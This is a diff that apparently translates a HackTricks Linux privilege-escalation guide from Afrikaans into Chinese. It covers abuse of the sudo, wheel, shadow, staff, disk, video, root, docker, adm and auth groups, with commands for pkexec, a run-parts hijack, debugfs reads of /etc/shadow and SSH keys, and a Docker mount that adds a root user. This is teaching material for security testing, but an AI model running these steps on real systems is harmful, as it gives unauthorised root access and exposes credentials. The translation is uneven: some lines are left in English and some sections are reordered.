@@ -1,25 +1,25 @@
-# Interessante Groepe - Linux Privesc
+# 有趣的组 - Linux 权限提升
 
 {% hint style="success" %}
-Leer & oefen AWS Hack:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Opleiding AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
-Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Opleiding GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+学习与实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习与实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary>Ondersteun HackTricks</summary>
+<summary>支持 HackTricks</summary>
 
-* Kontroleer die [**inskrywingsplanne**](https://github.com/sponsors/carlospolop)!
-* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Deel hacktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**Telegram 群组**](https://t.me/peass) 或 **关注** 我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub 仓库提交 PR 分享黑客技巧。
 
 </details>
 {% endhint %}
 
-## Sudo/Admin Groepe
+## Sudo/管理员组
 
-### **PE - Metode 1**
+### **PE - 方法 1**
 
-**Soms**, **standaard (of omdat sommige sagteware dit nodig het)** binne die **/etc/sudoers** lêer kan jy een van hierdie lyne vind:
+**有时**，**默认情况下（或因为某些软件需要它）**在 **/etc/sudoers** 文件中可以找到一些这样的行：
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -27,38 +27,38 @@ Leer & oefen GCP Hack: <img src="/.gitbook/assets/grte.png" alt="" data-size="li
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-Dit beteken dat **enige gebruiker wat behoort tot die groep sudo of admin enigiets as sudo kan uitvoer**.
+这意味着**任何属于sudo或admin组的用户都可以以sudo身份执行任何操作**。
 
-Indien dit die geval is, kan jy **root word deur net uit te voer**:
+如果是这种情况，要**成为root，你只需执行**：
 ```
 sudo su
 ```
-### PE - Metode 2
+### PE - 方法 2
 
-Vind alle suid-binêre en kontroleer of daar die binêre **Pkexec** is:
+查找所有 suid 二进制文件，并检查是否存在二进制文件 **Pkexec**：
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-Indien jy vind dat die binêre **pkexec 'n SUID-binêre** is en jy behoort aan **sudo** of **admin**, kan jy waarskynlik binêre lêers uitvoer as sudo deur `pkexec` te gebruik.\
-Dit is omdat hierdie groepe tipies binne die **polkit-beleid** is. Hierdie beleid identifiseer basies watter groepe `pkexec` kan gebruik. Kontroleer dit met:
+如果你发现二进制文件 **pkexec 是一个 SUID 二进制文件**，并且你属于 **sudo** 或 **admin**，你可能可以使用 `pkexec` 以 sudo 身份执行二进制文件。\
+这是因为通常这些是 **polkit 策略** 内的组。该策略基本上识别哪些组可以使用 `pkexec`。使用以下命令检查：
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-Daar sal jy vind watter groepe toegelaat word om **pkexec** uit te voer en **standaard** in sommige Linux-distros verskyn die groepe **sudo** en **admin**.  
+在那里你会发现哪些组被允许执行 **pkexec**，并且在某些 Linux 发行版中，**sudo** 和 **admin** 组默认出现。
 
-Om **root te word kan jy uitvoer**:
+要 **成为 root，你可以执行**：
 ```bash
 pkexec "/bin/sh" #You will be prompted for your user password
 ```
-Indien jy probeer om **pkexec** uit te voer en jy hierdie **fout** kry:
+如果你尝试执行 **pkexec** 并且收到这个 **错误**：
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-**Dit is nie omdat jy nie toestemmings het nie, maar omdat jy nie aanlyn is sonder 'n GUI nie**. En daar is 'n manier om hierdie probleem te omseil hier: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Jy benodig **2 verskillende ssh-sessies**:
+**这不是因为你没有权限，而是因为你没有通过GUI连接**。对此问题有一个解决方法在这里: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)。你需要**2个不同的ssh会话**：
 
-{% code title="sessie1" %}
+{% code title="session1" %}
 ```bash
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -66,38 +66,38 @@ pkexec "/bin/bash" #Step 3, execute pkexec
 ```
 {% endcode %}
 
-{% code title="sessie2" %}
+{% code title="session2" %}
 ```bash
 pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 #Step 4, you will be asked in this session to authenticate to pkexec
 ```
 {% endcode %}
 
-## Wielgroep
+## Wheel Group
 
-**Soms**, **standaard** binne die **/etc/sudoers** lê hierdie lyn:
+**有时**，**默认情况下**在**/etc/sudoers**文件中可以找到这一行：
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
-Dit beteken dat **enige gebruiker wat aan die wielgroep behoort, enigiets as sudo kan uitvoer**.
+这意味着**任何属于wheel组的用户都可以以sudo身份执行任何操作**。
 
-Indien dit die geval is, kan jy eenvoudig **root word deur uit te voer**:
+如果是这种情况，要**成为root，你只需执行**：
 ```
 sudo su
 ```
-## Skadugroep
+## Shadow Group
 
-Gebruikers van die **skadugroep** kan die **/etc/shadow** lêer **lees**:
+来自 **group shadow** 的用户可以 **read** **/etc/shadow** 文件：
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-So, lees die lêer en probeer **sommige hasse kraak**.
+So, read the file and try to **crack some hashes**.
 
-## Personeel Groep
+## Staff Group
 
-**personeel**: Laat gebruikers toe om plaaslike wysigings aan die stelsel (`/usr/local`) by te voeg sonder om root-voorregte nodig te hê (let wel dat uitvoerbare lêers in `/usr/local/bin` in die PATH-veranderlike van enige gebruiker is, en hulle mag die uitvoerbare lêers in `/bin` en `/usr/bin` met dieselfde naam "oorheers"). Vergelyk met die groep "adm", wat meer verband hou met monitering/sekuriteit. [\[bron\]](https://wiki.debian.org/SystemGroups)
+**staff**: 允许用户在不需要根权限的情况下对系统（`/usr/local`）进行本地修改（请注意，`/usr/local/bin` 中的可执行文件在任何用户的 PATH 变量中，并且它们可能会“覆盖” `/bin` 和 `/usr/bin` 中同名的可执行文件）。与更相关于监控/安全的 "adm" 组进行比较。 [\[source\]](https://wiki.debian.org/SystemGroups)
 
-In debian-verspreidings, wys die `$PATH`-veranderlike dat `/usr/local/` as die hoogste prioriteit uitgevoer sal word, of jy 'n bevoorregte gebruiker is of nie.
+在 debian 发行版中，`$PATH` 变量显示 `/usr/local/` 将以最高优先级运行，无论您是否是特权用户。
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -105,9 +105,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-Indien ons sommige programme in `/usr/local` kan kap, kan ons maklik 'n root kry.
+如果我们可以劫持 `/usr/local` 中的一些程序，我们就可以轻松获得 root 权限。
 
-Die kap van die `run-parts` program is 'n maklike manier om 'n root te kry, omdat die meeste programme 'n `run-parts` sal hardloop (soos crontab, wanneer ssh aanmeld).
+劫持 `run-parts` 程序是一种轻松获得 root 权限的方法，因为大多数程序会像 (crontab, 当 ssh 登录时) 一样运行 `run-parts`。
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -115,7 +115,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-of Wanneer 'n nuwe ssh-sessie aanmeld.
+或当新的 ssh 会话登录时。
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -128,7 +128,7 @@ $ pspy64
 2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
 2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
 ```
-**Uitbuiting**
+**利用**
 ```bash
 # 0x1 Add a run-parts script in /usr/local/bin/
 $ vi /usr/local/bin/run-parts
@@ -147,11 +147,11 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-## Skyf Groep
+## 磁盘组
 
-Hierdie voorreg is amper **gelykstaande aan worteltoegang** omdat jy toegang kan verkry tot alle data binne die masjien.
+此权限几乎**等同于根访问**，因为您可以访问机器内部的所有数据。
 
-Lêers: `/dev/sd[a-z][1-9]`
+文件：`/dev/sd[a-z][1-9]`
 ```bash
 df -h #Find where "/" is mounted
 debugfs /dev/sda1
@@ -160,45 +160,47 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-Merk op dat jy met debugfs ook **lêers kan skryf**. Byvoorbeeld, om `/tmp/asd1.txt` na `/tmp/asd2.txt` te kopieer, kan jy die volgende doen:
+注意，使用 debugfs 你也可以 **写文件**。例如，要将 `/tmp/asd1.txt` 复制到 `/tmp/asd2.txt`，你可以这样做：
 ```bash
 debugfs -w /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-### Video Groep
+然而，如果你尝试**写入由 root 拥有的文件**（如 `/etc/shadow` 或 `/etc/passwd`），你将会遇到“**权限被拒绝**”错误。
 
-Deur die opdrag `w` te gebruik, kan jy **sien wie op die stelsel ingeteken is** en dit sal 'n uitset soos die volgende een wys:
+## 视频组
+
+使用命令 `w` 你可以找到**谁已登录系统**，它将显示如下输出：
 ```bash
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-Die **tty1** beteken dat die gebruiker **yossi fisies ingeteken** is by 'n terminal op die rekenaar.
+**tty1** 表示用户 **yossi 正在物理登录** 到机器上的一个终端。
 
-Die **video groep** het toegang om die skermuitset te sien. Basies kan jy die skerms waarneem. Om dit te doen, moet jy **die huidige beeld op die skerm vasvang** in rou data en die resolusie kry wat die skerm gebruik. Die skermdata kan gestoor word in `/dev/fb0` en jy kan die resolusie van hierdie skerm vind op `/sys/class/graphics/fb0/virtual_size`
+**video group** 有权限查看屏幕输出。基本上，你可以观察屏幕。在此之前，你需要 **以原始数据抓取当前屏幕上的图像** 并获取屏幕使用的分辨率。屏幕数据可以保存在 `/dev/fb0`，你可以在 `/sys/class/graphics/fb0/virtual_size` 找到该屏幕的分辨率。
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
-Om die **rofbeeld** te **open**, kan jy **GIMP** gebruik, kies die \*\*`screen.raw` \*\* lêer en kies as lêertipe **Rofbeelddata**:
+要**打开** **原始图像**，您可以使用**GIMP**，选择**`screen.raw`**文件，并选择文件类型为**原始图像数据**：
 
 ![](<../../../.gitbook/assets/image (463).png>)
 
-Verander dan die Breedte en Hoogte na die wat op die skerm gebruik word en kyk na verskillende Beeldtipes (en kies die een wat die skerm beter wys):
+然后将宽度和高度修改为屏幕上使用的值，并检查不同的图像类型（并选择显示屏幕效果更好的那个）：
 
 ![](<../../../.gitbook/assets/image (317).png>)
 
-## Rooigroep
+## Root Group
 
-Dit lyk asof standaard **lede van die rooigroep** toegang kan hê om **sekere dienskonfigurasie-lêers** of **sekere biblioteeklêers** of **ander interessante dinge** te wysig wat gebruik kan word om voorregte te eskaleer...
+看起来默认情况下**root组的成员**可以访问**修改**某些**服务**配置文件或某些**库**文件或**其他有趣的东西**，这些都可以用来提升权限...
 
-**Kyk watter lêers rooigroeplede kan wysig**:
+**检查root成员可以修改哪些文件**：
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
-## Docker Groep
+## Docker 组
 
-Jy kan die hooflêersisteem van die gasrekenaar aan 'n instansie se volume **koppel**, sodat wanneer die instansie begin, dit onmiddellik 'n `chroot` in daardie volume laai. Dit gee jou effektief beheer oor die rekenaar.
+您可以**将主机的根文件系统挂载到实例的卷**，因此当实例启动时，它会立即加载一个 `chroot` 到该卷中。这实际上使您在机器上获得了 root 权限。
 ```bash
 docker image #Get images from the docker service
 
@@ -210,12 +212,45 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
 ```
-### LXC/LXD Groep
+最后，如果你不喜欢之前的任何建议，或者由于某种原因它们不起作用（docker api 防火墙？），你可以尝试**运行一个特权容器并从中逃逸**，如这里所述：
 
-Gewoonlik het **lede** van die groep **`adm`** toestemmings om **log** lêers binne _/var/log/_ te **lees**.\
-Daarom, as jy 'n gebruiker binne hierdie groep gekompromiteer het, moet jy beslis na die **logs kyk**.
+{% content-ref url="../docker-security/" %}
+[docker-security](../docker-security/)
+{% endcontent-ref %}
 
-### Auth groep
+如果你对 docker socket 有写权限，请阅读[**这篇关于如何通过滥用 docker socket 提升权限的文章**](../#writable-docker-socket)**。**
 
-Binne OpenBSD kan die **auth** groep gewoonlik skryfregte hê in die _**/etc/skey**_ en _**/var/db/yubikey**_ as hulle gebruik word.\
-Hierdie regte kan misbruik word met die volgende uitbuiting om **privileges te eskaleer** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}
+
+{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}
+
+## lxc/lxd 组
+
+{% content-ref url="./" %}
+[.](./)
+{% endcontent-ref %}
+
+## Adm 组
+
+通常，**`adm`** 组的**成员**有权限**读取**位于 _/var/log/_ 中的日志文件。\
+因此，如果你已经攻陷了这个组中的用户，你应该确实**查看日志**。
+
+## Auth 组
+
+在 OpenBSD 中，**auth** 组通常可以在 _**/etc/skey**_ 和 _**/var/db/yubikey**_ 文件夹中写入，如果它们被使用。\
+这些权限可能会被以下漏洞利用来**提升权限**到 root：[https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
+
+{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
+<details>
+
+<summary>支持 HackTricks</summary>
+
+* 查看 [**订阅计划**](https://github.com/sponsors/carlospolop)!
+* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram 群组**](https://t.me/peass) 或 **在 Twitter 上关注** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。
+
+</details>
+{% endhint %}
